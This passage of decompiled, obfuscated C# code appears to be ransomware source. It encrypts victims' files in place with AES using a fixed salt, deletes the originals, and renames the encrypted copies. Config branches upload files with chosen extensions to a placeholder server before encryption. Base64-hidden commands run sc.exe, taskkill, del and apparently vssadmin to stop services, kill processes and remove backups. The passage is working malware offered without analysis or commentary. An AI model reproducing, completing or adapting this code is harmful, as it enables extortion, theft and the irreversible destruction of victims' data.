										File.Move(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!xetcGCQIRoI)
						{
							if (!cqwcNhPdCH)
							{
								UzRQaROZaVQyO(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + ".part", WLkpdSTfqi);
							}
							else
							{
								UzRQaROZaVQyO(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!cqwcNhPdCH)
								{
									UjAXoJppaj(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, WLkpdSTfqi);
								}
								else
								{
									UjAXoJppaj(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (NZZJwvuCaIyu)
								{
									try
									{
										File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + " - Error while fully writing to file: " + ex14.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								kAIRALERmvGYRk++;
								return;
							}
						}
						if (cqwcNhPdCH)
						{
							if (CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL != ".*")
							{
								MBaDCxnytAAU(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK + CS_0024_003C_003E8__locals0.iLLbyCvEDeENhQL, bytes2);
							}
							else
							{
								MBaDCxnytAAU(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK, bytes2);
							}
						}
					}
					end_IL_02af_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0978;
			IL_0978:
			CS_0024_003C_003E8__locals0.bJYKLBcpDU.Remove(CS_0024_003C_003E8__locals0.QYLLJdwFdzqpEK);
		});
	}

	private static void PcyGFmEQsjGdEVbC(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (VjQPfxZAMTjUgJ == "YES")
					{
						foreach (string item in GkngOkBVtwXA)
						{
							if (string_0.ToLower().EndsWith(item) && kcuNJebGcjkOW == "YES")
							{
								if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && kcuNJebGcjkOW == "NO")
							{
								try
								{
									dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void UjAXoJppaj(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (VjQPfxZAMTjUgJ == "YES")
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in GkngOkBVtwXA)
				{
					if (string_0.ToLower().EndsWith(item) && kcuNJebGcjkOW == "YES")
					{
						if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && kcuNJebGcjkOW == "NO")
					{
						try
						{
							dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = KBdxgLGHgkeiH.XWZoHXBxnyxpF(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		RGcMmldgjxiBCQ++;
	}

	private static void UzRQaROZaVQyO(string string_0, string string_1, byte[] byte_0)
	{
		GXwfjtVIRyT CS_0024_003C_003E8__locals0 = new GXwfjtVIRyT();
		CS_0024_003C_003E8__locals0.lydtCbWOsLoA = string_0;
		CS_0024_003C_003E8__locals0.gKuLXjVygn = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string gKuLXjVygn = CS_0024_003C_003E8__locals0.gKuLXjVygn;
			FileStream fileStream = new FileStream(gKuLXjVygn, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (loBrWClZEFFu == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.lydtCbWOsLoA, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.lydtCbWOsLoA, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.lydtCbWOsLoA, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.gKuLXjVygn.Length > 0)
				{
					if (VjQPfxZAMTjUgJ == "YES")
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.lydtCbWOsLoA, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in GkngOkBVtwXA)
						{
							if (CS_0024_003C_003E8__locals0.lydtCbWOsLoA.ToLower().EndsWith(item) && kcuNJebGcjkOW == "YES")
							{
								if (Convert.ToInt32(HbtHzSSIxwCpn) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.lydtCbWOsLoA);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.lydtCbWOsLoA.ToLower().EndsWith(item) && kcuNJebGcjkOW == "NO")
							{
								try
								{
									dfEhXlxbLTgTMeE.fhbIKELowgO("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.lydtCbWOsLoA);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.lydtCbWOsLoA);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.gKuLXjVygn.EndsWith(".part"))
					{
						File.Move(CS_0024_003C_003E8__locals0.gKuLXjVygn, CS_0024_003C_003E8__locals0.gKuLXjVygn.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.gKuLXjVygn))
							{
								File.Delete(CS_0024_003C_003E8__locals0.gKuLXjVygn);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (NZZJwvuCaIyu)
			{
				try
				{
					File.AppendAllText(agUGmZJGeSw, "File: " + CS_0024_003C_003E8__locals0.lydtCbWOsLoA + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = fYAGGdcwZIgs;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				BYWGmjrQxPOi(aOUUGKAtMbj("c2MuZXhl"), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> source2 = jmWjqzKYeqJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				BYWGmjrQxPOi(aOUUGKAtMbj("dGFza2tpbGwuZXhl"), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (hExZUxcEhGVWj == "YES")
		{
			string[] mSrTCzMRlwKyFZcwa = MSrTCzMRlwKyFZcwa;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					BYWGmjrQxPOi(aOUUGKAtMbj("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
				};
			}
			Parallel.ForEach(mSrTCzMRlwKyFZcwa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!bZzwXTgSpki().Contains("XP"))
		{
			wnSUIUdJHSWSo(edsqPeUtqjjJV);
		}
		else
		{
			List<string> source3 = fzaAvBhjLkDq;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					BYWGmjrQxPOi(aOUUGKAtMbj(jojTjVgCWQek("lhXZu4WatRWYzNnd")), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> source4 = mcLlyCYytyHySi;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				BYWGmjrQxPOi(aOUUGKAtMbj("ZGVsLmV4ZQ=="), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		BYWGmjrQxPOi(aOUUGKAtMbj("c2MuZXhl"), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		BYWGmjrQxPOi(aOUUGKAtMbj("dGFza2tpbGwuZXhl"), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		BYWGmjrQxPOi(aOUUGKAtMbj("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		BYWGmjrQxPOi(aOUUGKAtMbj(jojTjVgCWQek("lhXZu4WatRWYzNnd")), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		BYWGmjrQxPOi(aOUUGKAtMbj("ZGVsLmV4ZQ=="), string_0);
	}
}
